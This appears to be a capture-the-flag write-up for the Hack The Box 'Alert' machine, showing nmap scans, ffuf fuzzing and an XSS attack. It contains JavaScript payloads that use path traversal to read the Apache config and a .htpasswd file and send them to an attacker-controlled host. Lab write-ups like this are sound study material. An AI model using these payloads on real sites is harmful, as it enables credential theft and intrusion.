# Alert


## Enumeration

???+ Note "Enumeration"

    === ":octicons-codespaces-16: Port Scanning"

        Command to obtain open ports on the target machine.

        ``` bash
        nmap -p- -sS --min-rate 5000 -n -Pn -vvv $HTB_IP -oG allPorts
        ```

        Result

        ``` bash
        # Nmap 7.99SVN scan initiated Fri Apr  3 14:21:05 2026 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.231.188
        # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
        Host: 10.129.231.188 () Status: Up
        Host: 10.129.231.188 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 12227/filtered/tcp/////       Ignored State: closed (65532)
        # Nmap done at Fri Apr  3 14:21:21 2026 -- 1 IP address (1 host up) scanned in 15.72 seconds
        ```

        !!! Info 

            In the result we can see two ports open and a filtered

    === ":octicons-code-review-16: Services running"

        Command to obtain the services running on each port

        ``` bash
        nmap -p{ports} -sCV $HTB_IP -oN targeted
        ```

        Result

        ``` bash hl_lines="11-15"
        # Nmap 7.99SVN scan initiated Fri Apr  3 14:44:46 2026 as: nmap -p22,80 -sCV -oN targeted 10.129.231.188
        Nmap scan report for alert.htb (10.129.231.188)
        Host is up (0.24s latency).

        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
        |   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
        |_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        | http-title: Alert - Markdown Viewer
        |_Requested resource was index.php?page=alert
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        # Nmap done at Fri Apr  3 14:45:06 2026 -- 1 IP address (1 host up) scanned in 19.93 seconds
        ```

        !!! Info

            We obtain the services *ssh* (port 22) and **http** (port 80) running, we can proceed analizing the http service on a browser.

## Fuzzing Web

???+ Example "Fuzzing Web"

    === ":octicons-browser-16: Look for directories"

        Looking for directories that may be present

        ``` bash
        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
            -u "http://alert.htb/FUZZ" \
            -ic
        ``` 

        Result 

        ``` bash
        css
        uploads
        messages
        server-status
        ```

        !!! Info

            No one of this shows something interesting.
    
    === ":octicons-browser-16: Look for php files"

        We already see that the webpage is working with **Apache httpd 2.4.41** so we can look for **php** files

        ``` bash
        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
            -u "http://alert.htb/FUZZ" \
            -ic -e .php
        ```

        Result

        ``` bash
        css
        contact.php
        uploads
        index.php
        messages
        messages.php
        server-status
        ```

        !!! Info

            No one of this shows something interesting.

    === ":octicons-browser-16: Look for subdomains"

        Now we can look for subdomains, for that we can use the following command.

        ``` bash
        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
            -H "http://FUZZ.alert.htb/" \
            -u http://alert.htb
        ```

        Result

        ``` bash
        mail
        bbs
        ns2
        webmail
        ns
        ...
        ```

        !!! Info

            There are many information, we need to filter it!

    === ":octicons-browser-16: Look for subdomains filtering"

        We obatined so many results, so we can filter based on the number of words.

        ``` bash
        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
            -H "http://FUZZ.alert.htb/" \
            -u http://alert.htb \
            -fw 20
        ```

        Result
        
        ``` bash
        statistics
        ```

        !!! Info

            This subdomain "http://statistics.alert.htb" requires credentials for access it.

## Cross Site Scripting

???+ Danger "Cross Site Scripting"

    === ":octicons-file-code-16: test.md"

        ``` js
        <script src="http://10.10.17.244:3000/pwn1.js"></script>
        ```

    === ":octicons-bug-16: pwn1.js"

        ``` js
        var req = new XMLHttpRequest();
        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf', false);
        req.send();

        var exfil = new XMLHttpRequest();
        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
        exfil.send();
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn1.js"
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn1.js"
        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/etc/apache2/sites-available/000-default.conf"
        ```

    === ":octicons-bug-16: pwn2.js"

        ``` js
        var req = new XMLHttpRequest();
        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd', false);
        req.send();

        var exfil = new XMLHttpRequest();
        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
        exfil.send();
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn2.js"
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn2.js"
        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/var/www/statistics.alert.htb/.htpasswd"
        ```



